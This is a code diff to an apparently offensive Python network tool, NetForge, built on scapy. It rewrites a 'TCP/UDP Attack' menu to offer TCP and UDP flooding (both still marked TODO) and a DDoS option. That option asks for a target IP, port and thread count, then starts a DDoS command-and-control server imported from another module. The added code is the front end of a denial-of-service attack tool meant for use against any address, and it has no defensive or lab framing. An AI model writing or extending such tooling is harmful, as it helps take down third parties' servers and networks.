@@ -1,11 +1,10 @@
-
 import os, sys, time, itertools
 import scapy.all as scapy
 from scapy.interfaces import NetworkInterface
 
 from .utils import *
 from .interface import NF_Interface
-
+from .ddos.cnc import NetForge_DDoS_CNC_Server
 
 class NF_TCPUDPTool:
     def __init__(self, interface: NetworkInterface): 
@@ -15,23 +14,14 @@ class NF_TCPUDPTool:
 
     def menu(self) -> None:
         def print_menu():
-            selected = self.interface.description if self.interface else 'not selected'
-            selected = str_fixed_len(selected, 52)
-            info = ''
-            if self.interface:
-                network = NF_Interface.get_network_address_with_cidr(self.interface)
-                gateway = NF_Interface.get_gateway_address(self.interface)
-                info = '\n |   Network: {:18}      Gateway: {:15}       |'.format(
-                    network if network else 'no network', gateway if gateway else 'no gateway'
-                )
             print(f'''
  +-------------------------------------------------------------------+
  |                        < TCP/UDP Attack >                         |
  +-------------------------------------------------------------------+
- |   Interface: {selected} |{info}
- +-------------------------------------------------------------------+
  |                                                                   |
- |   No menu yet.                                                    |
+ |   (1) TCP Flooding                  (2) UDP Flooding              |
+ |                                                                   |
+ |   (3) DDoS Flooding (Run C&C Server)                              |
  |                                                                   |
  |   (0) Back to Main Menu                                           |
  |                                                                   |
@@ -47,6 +37,23 @@ class NF_TCPUDPTool:
             print()
 
             if i == '0':
+                break
+            elif i == '1':
+                print('TODO feature')
+                continue
+            elif i == '2':
+                print('TODO feature')
+                continue
+            elif i == '3':
+                ip = input('[?] Enter a IP address to DDoS attack : ').strip()
+                print()
+                if not is_valid_ipv4(ip):
+                    print('[-] IP address entered is invalid.\n')
+                    continue
+                port = int((input('[?] Enter a port (UDP) (8080) : ') or '8080').strip())
+                threads = int((input('[?] Enter thread count to use (10) : ') or '10').strip())
+                cnc = NetForge_DDoS_CNC_Server(ip, port, threads)
+                cnc.start()
                 break
             else:
                 continue
